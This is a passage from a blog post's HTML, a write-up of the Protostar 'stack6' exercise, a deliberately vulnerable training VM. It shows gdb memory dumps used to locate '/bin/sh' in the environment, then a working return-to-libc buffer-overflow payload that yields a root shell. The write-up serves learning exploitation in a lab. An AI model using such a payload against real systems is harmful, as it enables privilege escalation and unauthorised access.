class="line">0xbfffff92:	 <span class="string">"HACK=/bin/sh"</span></span><br><span class="line">(gdb) x/20s 0xbffff9cc +0x30</span><br><span class="line">0xbffff9fc:	 <span class="string">"in"</span></span><br><span class="line">0xbffff9ff:	 <span class="string">"SSH_TTY=/dev/pts/0"</span></span><br><span class="line">0xbffffa12:	 <span class="string">"LOGNAME=user"</span></span><br><span class="line">0xbffffa1f:	 <span class="string">"_=/usr/bin/gdb"</span></span><br><span class="line">0xbffffa2e:	 <span class="string">"COLUMNS=213"</span></span><br><span class="line">0xbffffa3a:	 <span class="string">"TERM=xterm"</span></span><br><span class="line">0xbffffa45:	 <span class="string">"PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"</span></span><br><span class="line">0xbffffa83:	 <span class="string">"LANG=en_US.UTF-8"</span></span><br><span class="line">0xbffffa94:	 <span class="string">"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"</span>...</span><br><span class="line">0xbffffb5c:	 <span class="string">":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"</span>...</span><br><span class="line">0xbffffc24:	 <span class="string">"eb=01;31:*.rpm=01;31:*.jar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35"</span>...</span><br><span class="line">0xbffffcec:	 <span class="string">":*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.ogm=01;35:*.mp4=01;35:*.m4"</span>...</span><br><span class="line">0xbffffdb4:	 <span class="string">"v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*."</span>...</span><br><span class="line">0xbffffe7c:	 <span class="string">"yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;3"</span>...</span><br><span class="line">0xbfffff44:	 <span class="string">"6:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"</span></span><br><span class="line">0xbfffff84:	 <span class="string">"SHELL=/bin/sh"</span></span><br><span class="line">0xbfffff92:	 <span class="string">"HACK=/bin/sh"</span></span><br><span class="line">0xbfffff9f:	 <span class="string">"PWD=/home/user"</span></span><br><span class="line">0xbfffffae:	 <span class="string">"SSH_CONNECTION=10.0.2.2 36821 10.0.2.15 22"</span></span><br><span class="line">0xbfffffd9:	 <span class="string">"LINES=58"</span></span><br></pre></td></tr></table></figure>
+<p>If we take a look at the error message we get from the exploit, we can see that the address we entered pointed to  2.2 which is part of the SSH_CONNECTION variable. Now, if we substract the right amount of bytes from that address, we should be able to point to “/bin/sh”. There are exactly 48 chars frrom 2.2 to /bin/sh so if we substract 48 to 0xbffff9c7 we should get the right address.<br>let’s test it out :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:~$ python -c <span class="string">'print 80*"a"+"\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\x9b\xf9\xff\xbf"'</span> &gt; payload</span><br><span class="line">user@protostar:~$ cat payload -| /opt/protostar/bin/./stack6</span><br><span class="line">input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����aaaaaaaaaaaa�����`췛���</span><br><span class="line">ls</span><br><span class="line">payload  sys  sys.c  var  var.c</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<p>It works !</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://slayne.github.io/2016/02/16/stack6/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://slayne.github.io/2016/02/16/stack6/&text=Protostar vm, stack6"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://slayne.github.io/2016/02/16/stack6/&title=Protostar vm, stack6"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://slayne.github.io/2016/02/16/stack6/&is_video=false&description=Protostar vm, stack6"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Protostar vm, stack6&body=Check out this article: http://slayne.github.io/2016/02/16/stack6/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://slayne.github.io/2016/02/16/stack6/&title=Protostar vm, stack6"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://slayne.github.io/2016/02/16/stack6/&title=Protostar vm, stack6"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://slayne.github.io/2016/02/16/stack6/&title=Protostar vm, stack6"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://slayne.github.io/2016/02/16/stack6/&title=Protostar vm, stack6"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://slayne.github.io/2016/02/16/stack6/&name=Protostar vm, stack6&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 slayne
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
